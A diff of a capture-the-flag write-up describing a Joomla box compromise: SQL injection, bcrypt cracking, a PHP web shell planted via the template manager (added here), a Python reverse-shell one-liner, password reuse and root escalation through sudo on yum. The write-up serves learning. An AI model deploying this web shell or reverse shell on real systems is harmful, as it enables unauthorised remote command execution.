@@ -35,11 +35,26 @@ sqlmap -u "http://10.10.69.3/index.php?option=com_fields&view=fields&layout=moda
 
 This gave me the hash for 'jonah': `$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm`. A standard bcrypt hash. Using hashcat on my windows machine (where my NVidia 2080 lives), I cracked this via `.\hashcat64.exe -m 3200 ..\hash.txt ..\rockyou.txt` (3200 for a bcrypt hash, as indicated by the `$2y`). The password was `spiderman123` :)
 
-## a shell through joomla and escalation
+## a shell through joomla
 
-The credentials didn't work for mysql or ssh, but they did log me into Joomla. Once in, I went to the template manager and used it to stick a php shell directly into the index page, placing it just below the heading. Nice.
+The credentials didn't work for mysql or ssh, but they did log me into Joomla. Once in, I went to the template manager and used it to stick a php shell (`<?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>`) directly into the index page, placing it just below the heading. Nice.
 
 With this I dropped my handy python reverse shell one liner (below), and got a shell as `apache` on the system:
 
 Python one liner: `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.105.239",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`
 
+## enumeration and getting stuck
+
+At this point I was stuck. There were no obvious suid objects, I didn't have the password and so couldn't `sudo -l`, and the apache user had no access to any folders of note, not even the 'jjameson' home folder.
+
+I did have access to mysql: the joomla home dir contained a configuration.php file which contained the password for 'root': `nv5uz9r3ZEDzVjNu`. I also tried this with `su root`, just in case they had been doubled up, but no dice.
+
+I also tried [linpeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) but it found all the same things, including the db password.
+
+In the end I had to go for a hint, reading a walkthrough. The answer was, in my opinion, dumb: the password for the root db user was also jjameson's password! /facepalm.
+
+If I learn something from this, its that when you have **A** password, and multiple users, try the password on all the users. Its not just a CTF thing: people reuse passwords.
+
+## finish
+
+With `su jjameson` I got the user flag. Then `sudo -l` revealed he had sudo on `yum`. A quick run of [this script from gtfobins](https://gtfobins.github.io/gtfobins/yum/) got me a root shell, and then the root flag.
